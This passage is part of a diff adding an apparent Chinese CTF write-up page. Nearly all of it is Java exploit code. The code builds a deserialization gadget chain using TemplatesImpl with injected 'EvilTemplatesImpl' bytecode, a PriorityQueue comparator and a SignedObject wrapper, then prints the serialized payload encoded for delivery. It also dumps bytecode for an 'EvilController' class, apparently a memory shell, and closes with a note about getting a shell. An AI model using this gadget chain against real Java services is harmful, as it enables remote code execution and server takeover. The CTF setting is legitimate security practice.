+</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="n">PriorityQueue</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">queue</span> <span class="o">=</span> <span class="k">new</span> <span class="n">PriorityQueue</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;(</span><span class="mi">2</span><span class="o">,</span> <span class="n">comparator</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// stub data for replacement later
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">queue</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="mi">1</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">queue</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="mi">1</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">comparator</span><span class="o">,</span> <span class="s">&#34;property&#34;</span><span class="o">,</span> <span class="s">&#34;outputProperties&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">queue</span><span class="o">,</span> <span class="s">&#34;queue&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="n">obj</span><span class="o">,</span> <span class="n">obj</span><span class="o">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">queue</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nd">@org.junit.jupiter.api.Test</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">test1</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">TemplatesImpl</span> <span class="n">obj</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TemplatesImpl</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">&#34;_bytecodes&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[][]{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">ClassPool</span><span class="o">.</span><span class="na">getDefault</span><span class="o">().</span><span class="na">get</span><span class="o">(</span><span class="n">EvilTemplatesImpl</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">()).</span><span class="na">toBytecode</span><span class="o">()</span>
+</span></span><span class="line"><span class="cl">        <span class="o">});</span>
+</span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">&#34;_name&#34;</span><span class="o">,</span> <span class="s">&#34;HelloTemplatesImpl&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">&#34;_tfactory&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">TransformerFactoryImpl</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl">        <span class="n">PriorityQueue</span> <span class="n">queue1</span> <span class="o">=</span> <span class="n">getpayload</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">&#34;outputProperties&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">KeyPairGenerator</span> <span class="n">kpg</span> <span class="o">=</span> <span class="n">KeyPairGenerator</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">&#34;DSA&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">kpg</span><span class="o">.</span><span class="na">initialize</span><span class="o">(</span><span class="mi">1024</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">KeyPair</span> <span class="n">kp</span> <span class="o">=</span> <span class="n">kpg</span><span class="o">.</span><span class="na">generateKeyPair</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">SignedObject</span> <span class="n">signedObject</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SignedObject</span><span class="o">(</span><span class="n">queue1</span><span class="o">,</span> <span class="n">kp</span><span class="o">.</span><span class="na">getPrivate</span><span class="o">(),</span> <span class="n">Signature</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">&#34;DSA&#34;</span><span class="o">));</span>
+</span></span><span class="line"><span class="cl">        <span class="n">PriorityQueue</span> <span class="n">queue2</span> <span class="o">=</span> <span class="n">getpayload</span><span class="o">(</span><span class="n">signedObject</span><span class="o">,</span> <span class="s">&#34;object&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">ByteArrayOutputStream</span> <span class="n">byteArrayOutputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ObjectOutputStream</span> <span class="n">outputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="n">byteArrayOutputStream</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//按顺序写入
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">outputStream</span><span class="o">.</span><span class="na">writeUTF</span><span class="o">(</span><span class="s">&#34;I_LIJd_NANAMI&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">outputStream</span><span class="o">.</span><span class="na">writeInt</span><span class="o">(</span><span class="mi">2023</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">outputStream</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">queue2</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">outputStream</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">codes</span> <span class="o">=</span> <span class="n">URLEncoder</span><span class="o">.</span><span class="na">encode</span><span class="o">(</span><span class="n">Base64</span><span class="o">.</span><span class="na">getEncoder</span><span class="o">().</span><span class="na">encodeToString</span><span class="o">(</span><span class="n">byteArrayOutputStream</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">()),</span><span class="s">&#34;UTF-8&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">codes</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">hexcodes</span> <span class="o">=</span><span class="n">bytesTohexString</span><span class="o">(</span><span class="n">byteArrayOutputStream</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">hexcodes</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nd">@org.junit.jupiter.api.Test</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">test2</span><span class="o">()</span><span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span> <span class="o">=</span> <span class="n">ClassPool</span><span class="o">.</span><span class="na">getDefault</span><span class="o">().</span><span class="na">get</span><span class="o">(</span><span class="n">EvilController</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">()).</span><span class="na">toBytecode</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">Arrays</span><span class="o">.</span><span class="na">toString</span><span class="o">(</span><span class="n">bytes</span><span class="o">).</span><span class="na">replace</span><span class="o">(</span><span class="sc">&#39;[&#39;</span><span class="o">,</span> <span class="sc">&#39;{&#39;</span><span class="o">).</span><span class="na">replace</span><span class="o">(</span><span class="sc">&#39;]&#39;</span><span class="o">,</span> <span class="sc">&#39;}&#39;</span><span class="o">));</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">bytesTohexString</span><span class="o">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">bytes</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">StringBuilder</span> <span class="n">ret</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuilder</span><span class="o">(</span><span class="mi">2</span> <span class="o">*</span> <span class="n">bytes</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">bytes</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">int</span> <span class="n">b</span> <span class="o">=</span> <span class="mh">0xF</span> <span class="o">&amp;</span> <span class="n">bytes</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">ret</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">&#34;0123456789abcdef&#34;</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">b</span><span class="o">));</span>
+</span></span><span class="line"><span class="cl">            <span class="n">b</span> <span class="o">=</span> <span class="mh">0xF</span> <span class="o">&amp;</span> <span class="n">bytes</span><span class="o">[</span><span class="n">i</span><span class="o">];</span>
+</span></span><span class="line"><span class="cl">            <span class="n">ret</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">&#34;0123456789abcdef&#34;</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">b</span><span class="o">));</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">ret</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div></div><p>内存马部分自己塞一份吧</p>
+<p>最后getshell,flag在环境变量里</p>
+</article>
+
+        <nav class="c-post__nav">
+            
+            <a href="/post/a-php-issue" class="c-post__nav-card c-post__nav-card--prev">
+                <h3>‹ 上一篇</h3>
+                <p class="c-post__nav-title">A PHP Issue</p>
+            </a>
+            
+
+            
+            <a href="/post/ciscn-2023" class="c-post__nav-card c-post__nav-card--next">
+                <h3>下一篇 ›</h3>
+                <p class="c-post__nav-title">CISCN-2023</p>
+            </a>
+            
+        </nav>
+    </div>
+</div>
+
+    </main>
+    <footer class="c-footer">
+        <span id="jinrishici-sentence" class="c-footer__quote">今日诗词加载中....</span>
+        <div class="c-footer__copy">
+            Copyright © <span id="currentYear">2025</span> Dionysus. All rights reserved.
+        </div>
+    </footer>
+</div>
+
+<div id="algolia-search-mask" class="c-search-mask"></div>
+<div id="algolia-search-modal" class="c-search-modal">
+    <div class="c-search-modal__box">
+        <div class="c-search-modal__header">搜索</div>
+        <div class="c-search-modal__summary" id="algolia-search-summary" style="display:none;">共找到 0 条结果</div>
+        <input type="text" id="algolia-search-input" class="c-search-modal__input" placeholder="请输入关键词..." />
+        <div id="algolia-search-results" class="c-search-modal__results"></div>
+        <div id="algolia-pagination" class="c-search-modal__pagination"></div>
+        <hr class="c-search-modal__divider" />
+    </div>
+</div>
+
+<script src='https://static.dionysus.zip/static/js/app-IJHRYWUS.js' defer></script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js" defer></script>
+<script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8" defer></script>
+</body>
+</html>
+
